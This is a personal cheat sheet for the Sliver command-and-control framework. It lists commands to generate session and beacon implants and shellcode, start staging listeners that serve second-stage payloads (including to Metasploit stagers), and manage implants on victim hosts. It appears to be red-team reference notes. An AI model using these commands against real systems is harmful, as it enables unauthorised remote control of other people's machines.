# Sliver

### Overview

- launch with `sliver-server`
- Sliver has 2 modes:
	- **Session** - Real time communication using either a persistent connection or using long polling depending on the underlying C2 protocol.
		- `generate --mtls 192.168.1.18 -s ~/sliver`
		- `profiles generate -s ~/sliver profile-name`
		- `sessions`
			- `use <session>`
			- `background`
			- `close` Close connection while keeping binary running on victim, session will eventually reopen if listener is up
	- **Beacon** - Asynchronous communication style where the implant periodically checks in with the server retrieves tasks, executes them, and returns the results.
		- `generate beacon --mtls 192.168.1.18 -s ~/sliver`
		- `profiles generate -s ~/sliver profile-name`
		- `beacons`
			- `watch`
		- `tasks <beacon>` Manage beacon tasks
		- `interactive <beacon>` Task a beacon to open an interactive session
	- Specify format with `-f`.
		- `exe` (default)
		- `shared`
		- `service` (see `psexec` for more info)
		- `shellcode`
	- Specify connection type with `--mtls`, `--wg`, `--http`, or `--dns`.
		- Note that when an implant attempts to connect to an endpoint specified using `--http` it will try both HTTPS and then HTTP (if HTTPS fails).
		- It is recommended to use mTLS (`--mtls`) or WireGuard (`--wg`) whenever possible.

### Stagers

Stagers are strongly advised as payloads can be large. They also perform the following:
- Read the size of the stage 2 payload on the wire (the first 4 bytes for the TCP stager)
- Download the stage 2
- Allocate the size read in the first step, and write the stage in memory (this is why the stager has a different name to the implant, as the connection is moved from the stager to the implant)

### Stager Generation

1. Create an implant profile. Provides an easy way to save implant configuration and easily generate multiple copies of binaries with the same settings while still having per-binary certificates/obfuscation/etc.
	- `profiles new --mtls 192.168.1.18 --format shellcode win-shellcode`
		- Specify the sliver as a beacon with `profiles new beacon`
2. Start a listener based on the newly created profile
	- `stage-listener --url http://192.168.1.18:1234 --profile win-shellcode`
		- `--url` only accepts the schemes `tcp://`, `http://` and `https://`
		- Add `--prepend-size` to allow connections from Metasploit stagers
		- Check listeners with the command: `jobs`
2. `generate stager -L 192.168.1.18 -l 1234 -r http-s /tmp`

### Management Commands

- `use <session/beacon>`
- `jobs` Manage listeners
- `hosts`
	- `ioc` Manage tracked IOCs
- `implants` View previously generated implant binaries
	- `regenerate <name>` Re-download previously generated implant (can use save flag)
- `update`

### Management Flags

- `prune` Kill all stale beacons/sessions automatically
- `rm` Remove beacons/hosts/implants from database
- `-k <id>` Kill one (sessions, beacons and jobs)
- `-K` Kill all (sessions, beacons and jobs)
- `-F` Force kill (sessions and beacons)

### Armory

- `armory` Download and install extensions/aliases
	- `install`
	- `search`
	- `update`

### Additional Notes
- Add `-h` to the end of any command to see usage
